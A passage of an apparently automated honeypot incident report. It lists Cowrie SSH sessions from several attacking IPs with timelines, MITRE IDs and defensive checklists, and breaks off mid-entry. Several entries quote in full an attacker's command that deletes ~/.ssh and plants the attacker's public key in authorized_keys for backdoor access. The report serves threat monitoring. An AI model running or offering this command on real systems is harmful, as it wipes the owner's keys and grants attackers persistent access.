| `2026-05-26 04:50:14` | `cowrie.command.failed` |
| `2026-05-26 04:50:15` | `cowrie.log.closed` |
| `2026-05-26 04:50:15` | `cowrie.session.params` |
| `2026-05-26 04:50:15` | `cowrie.command.input` |
| `2026-05-26 04:50:15` | `cowrie.session.file_download` |
| `2026-05-26 04:50:15` | `cowrie.log.closed` |
| `2026-05-26 04:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ae70e37e28

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:50 |
| **Last Seen** | 2026-05-26 04:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:50:17` | `cowrie.session.connect` |
| `2026-05-26 04:50:17` | `cowrie.client.version` |
| `2026-05-26 04:50:17` | `cowrie.client.kex` |
| `2026-05-26 04:50:18` | `cowrie.login.success` |
| `2026-05-26 04:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1012ec565e8b

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:50 |
| **Last Seen** | 2026-05-26 04:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:50:36` | `cowrie.session.connect` |
| `2026-05-26 04:50:36` | `cowrie.client.version` |
| `2026-05-26 04:50:36` | `cowrie.client.kex` |
| `2026-05-26 04:50:36` | `cowrie.login.success` |
| `2026-05-26 04:50:37` | `cowrie.session.params` |
| `2026-05-26 04:50:37` | `cowrie.command.input` |
| `2026-05-26 04:50:37` | `cowrie.command.failed` |
| `2026-05-26 04:50:37` | `cowrie.log.closed` |
| `2026-05-26 04:50:37` | `cowrie.session.params` |
| `2026-05-26 04:50:37` | `cowrie.command.input` |
| `2026-05-26 04:50:37` | `cowrie.session.file_download` |
| `2026-05-26 04:50:37` | `cowrie.log.closed` |
| `2026-05-26 04:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a799be39465

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:50 |
| **Last Seen** | 2026-05-26 04:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:50:37` | `cowrie.session.connect` |
| `2026-05-26 04:50:37` | `cowrie.client.version` |
| `2026-05-26 04:50:38` | `cowrie.client.kex` |
| `2026-05-26 04:50:38` | `cowrie.login.success` |
| `2026-05-26 04:50:38` | `cowrie.session.params` |
| `2026-05-26 04:50:38` | `cowrie.command.input` |
| `2026-05-26 04:50:38` | `cowrie.command.failed` |
| `2026-05-26 04:50:39` | `cowrie.log.closed` |
| `2026-05-26 04:50:39` | `cowrie.session.params` |
| `2026-05-26 04:50:39` | `cowrie.command.input` |
| `2026-05-26 04:50:39` | `cowrie.session.file_download` |
| `2026-05-26 04:50:39` | `cowrie.log.closed` |
| `2026-05-26 04:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2caa3c496545

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:50 |
| **Last Seen** | 2026-05-26 04:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:50:40` | `cowrie.session.connect` |
| `2026-05-26 04:50:40` | `cowrie.client.version` |
| `2026-05-26 04:50:40` | `cowrie.client.kex` |
| `2026-05-26 04:50:40` | `cowrie.login.success` |
| `2026-05-26 04:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9278f00cc90

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:50 |
| **Last Seen** | 2026-05-26 04:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:50:41` | `cowrie.session.connect` |
| `2026-05-26 04:50:41` | `cowrie.client.version` |
| `2026-05-26 04:50:41` | `cowrie.client.kex` |
| `2026-05-26 04:50:41` | `cowrie.login.success` |
| `2026-05-26 04:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3413de546a7d

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:51 |
| **Last Seen** | 2026-05-26 04:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:51:21` | `cowrie.session.connect` |
| `2026-05-26 04:51:21` | `cowrie.client.version` |
| `2026-05-26 04:51:21` | `cowrie.client.kex` |
| `2026-05-26 04:51:22` | `cowrie.login.success` |
| `2026-05-26 04:51:22` | `cowrie.session.params` |
| `2026-05-26 04:51:22` | `cowrie.command.input` |
| `2026-05-26 04:51:22` | `cowrie.command.failed` |
| `2026-05-26 04:51:22` | `cowrie.log.closed` |
| `2026-05-26 04:51:23` | `cowrie.session.params` |
| `2026-05-26 04:51:23` | `cowrie.command.input` |
| `2026-05-26 04:51:23` | `cowrie.session.file_download` |
| `2026-05-26 04:51:23` | `cowrie.log.closed` |
| `2026-05-26 04:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4142bda1b03c

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:51 |
| **Last Seen** | 2026-05-26 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:51:25` | `cowrie.session.connect` |
| `2026-05-26 04:51:25` | `cowrie.client.version` |
| `2026-05-26 04:51:25` | `cowrie.client.kex` |
| `2026-05-26 04:51:26` | `cowrie.login.success` |
| `2026-05-26 04:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354200a656d3

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:51 |
| **Last Seen** | 2026-05-26 04:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:51:47` | `cowrie.session.connect` |
| `2026-05-26 04:51:47` | `cowrie.client.version` |
| `2026-05-26 04:51:47` | `cowrie.client.kex` |
| `2026-05-26 04:51:47` | `cowrie.login.success` |
| `2026-05-26 04:51:48` | `cowrie.session.params` |
| `2026-05-26 04:51:48` | `cowrie.command.input` |
| `2026-05-26 04:51:48` | `cowrie.command.failed` |
| `2026-05-26 04:51:48` | `cowrie.log.closed` |
| `2026-05-26 04:51:48` | `cowrie.session.params` |
| `2026-05-26 04:51:48` | `cowrie.command.input` |
| `2026-05-26 04:51:48` | `cowrie.session.file_download` |
| `2026-05-26 04:51:48` | `cowrie.log.closed` |
| `2026-05-26 04:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67cb3e1b37a9

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:51 |
| **Last Seen** | 2026-05-26 04:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:51:50` | `cowrie.session.connect` |
| `2026-05-26 04:51:50` | `cowrie.client.version` |
| `2026-05-26 04:51:51` | `cowrie.client.kex` |
| `2026-05-26 04:51:51` | `cowrie.login.success` |
| `2026-05-26 04:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b3507b95147

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:52 |
| **Last Seen** | 2026-05-26 04:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:52:35` | `cowrie.session.connect` |
| `2026-05-26 04:52:35` | `cowrie.client.version` |
| `2026-05-26 04:52:35` | `cowrie.client.kex` |
| `2026-05-26 04:52:35` | `cowrie.login.success` |
| `2026-05-26 04:52:36` | `cowrie.session.params` |
| `2026-05-26 04:52:36` | `cowrie.command.input` |
| `2026-05-26 04:52:36` | `cowrie.command.failed` |
| `2026-05-26 04:52:36` | `cowrie.log.closed` |
| `2026-05-26 04:52:36` | `cowrie.session.params` |
| `2026-05-26 04:52:36` | `cowrie.command.input` |
| `2026-05-26 04:52:36` | `cowrie.session.file_download` |
| `2026-05-26 04:52:36` | `cowrie.log.closed` |
| `2026-05-26 04:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0650991f976a

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:52 |
| **Last Seen** | 2026-05-26 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:52:38` | `cowrie.session.connect` |
| `2026-05-26 04:52:38` | `cowrie.client.version` |
| `2026-05-26 04:52:39` | `cowrie.client.kex` |
| `2026-05-26 04:52:39` | `cowrie.login.success` |
| `2026-05-26 04:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c6e050cfa2

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:52 |
| **Last Seen** | 2026-05-26 04:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:52:51` | `cowrie.session.connect` |
| `2026-05-26 04:52:51` | `cowrie.client.version` |
| `2026-05-26 04:52:51` | `cowrie.client.kex` |
| `2026-05-26 04:52:52` | `cowrie.login.success` |
| `2026-05-26 04:52:52` | `cowrie.session.params` |
| `2026-05-26 04:52:52` | `cowrie.command.input` |
| `2026-05-26 04:52:52` | `cowrie.command.failed` |
| `2026-05-26 04:52:52` | `cowrie.log.closed` |
| `2026-05-26 04:52:53` | `cowrie.session.params` |
| `2026-05-26 04:52:53` | `cowrie.command.input` |
| `2026-05-26 04:52:53` | `cowrie.session.file_download` |
| `2026-05-26 04:52:53` | `cowrie.log.closed` |
| `2026-05-26 04:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df9a14e3662

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:52 |
| **Last Seen** | 2026-05-26 04:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:52:57` | `cowrie.session.connect` |
| `2026-05-26 04:52:57` | `cowrie.client.version` |
| `2026-05-26 04:52:57` | `cowrie.client.kex` |
| `2026-05-26 04:52:58` | `cowrie.login.success` |
| `2026-05-26 04:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255380254d12

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-05-26 05:09 |
| **Last Seen** | 2026-05-26 05:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 05:09:51` | `cowrie.session.connect` |
| `2026-05-26 05:09:51` | `cowrie.client.version` |
| `2026-05-26 05:09:51` | `cowrie.client.kex` |
| `2026-05-26 05:09:52` | `cowrie.login.success` |
| `2026-05-26 05:09:52` | `cowrie.session.params` |
| `2026-05-26 05:09:52` | `cowrie.command.input` |
| `2026-05-26 05:09:52` | `cowrie.command.failed` |
| `2026-05-26 05:09:52` | `cowrie.log.closed` |
| `2026-05-26 05:09:52` | `cowrie.session.params` |
| `2026-05-26 05:09:52` | `cowrie.command.input` |
| `2026-05-26 05:09:52` | `cowrie.session.file_download` |
| `2026-05-26 05:09:52` | `cowrie.log.closed` |
| `2026-05-26 05:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-770e7232d34b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-05-26 05:09 |
| **Last Seen** | 2026-05-26 05:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 05:09:54` | `cowrie.session.connect` |
| `2026-05-26 05:09:54` | `cowrie.client.version` |
| `2026-05-26 05:09:54` | `cowrie.client.kex` |
| `2026-05-26 05:09:54` | `cowrie.login.success` |
| `2026-05-26 05:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c2dc43f9896

| Field | Detail |
|---|---|
| **Source IP** | `180.76.243[.]197` |
| **First Seen** | 2026-05-26 05:17 |
| **Last Seen** | 2026-05-26 05:17 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 05:17:39` | `cowrie.session.connect` |
| `2026-05-26 05:17:39` | `cowrie.client.version` |
| `2026-05-26 05:17:40` | `cowrie.client.kex` |
| `2026-05-26 05:17:40` | `cowrie.login.success` |
| `2026-05-26 05:17:42` | `cowrie.session.params` |
| `2026-05-26 05:17:42` | `cowrie.command.input` |
| `2026-05-26 05:17:42` | `cowrie.command.failed` |
| `2026-05-26 05:17:46` | `cowrie.log.closed` |
| `2026-05-26 05:17:51` | `cowrie.session.params` |
| `2026-05-26 05:17:51` | `cowrie.command.input` |
| `2026-05-26 05:17:52` | `cowrie.session.file_download` |
| `2026-05-26 05:17:52` | `cowrie.log.closed` |
| `2026-05-26 05:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.243[.]197` to AbuseIPDB if not already reported
- [ ] Block `180.76.243[.]197` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e0631718536

| Field | Detail |
|---|---|
| **Source IP** | `180.76.243[.]197` |
| **First Seen** | 2026-05-26 05:17 |
| **Last Seen** | 2026-05-26 05:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 05:17:57` | `cowrie.session.connect` |
| `2026-05-26 05:17:57` | `cowrie.client.version` |
| `2026-05-26 05:17:58` | `cowrie.client.kex` |
| `2026-05-26 05:17:59` | `cowrie.login.success` |
| `2026-05-26 05:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.243[.]197` to AbuseIPDB if not already reported
- [ ] Block `180.76.243[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e408f3959de

| Field | Detail |
|---|---|
